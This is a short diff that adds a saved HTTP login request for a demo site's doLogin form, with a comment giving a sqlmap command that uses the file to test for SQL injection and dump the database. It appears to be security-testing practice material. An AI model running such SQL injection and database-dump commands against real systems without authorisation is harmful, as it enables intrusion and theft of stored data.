@@ -1,0 +1,3 @@
+http://demo.testfire.net:80/doLogin (POST)  # .\sqlmap.py -r .\postReqs\testfire --dump
+
+uid=dsadasd&passw=asdasd&btnSubmit=Login
